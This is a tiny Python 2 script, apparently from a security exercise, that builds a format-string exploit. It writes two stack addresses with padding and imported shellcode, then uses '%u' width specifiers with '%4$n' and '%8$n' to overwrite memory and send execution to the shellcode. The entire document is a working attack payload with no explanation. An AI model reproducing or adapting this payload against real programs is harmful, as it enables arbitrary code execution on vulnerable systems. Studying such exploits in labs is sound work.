from  shellcode import shellcode
from struct import pack

print  '\x3c'+ '\xde' + '\xfe' + '\xbf' + ("\xAA"*12) + '\x3e'+ '\xde' + '\xfe' + '\xbf' + ("\xAA"*12) + shellcode + '-%54807u' + '-' '%4$n' + '-' + '%59820u' + '-' '%8$n'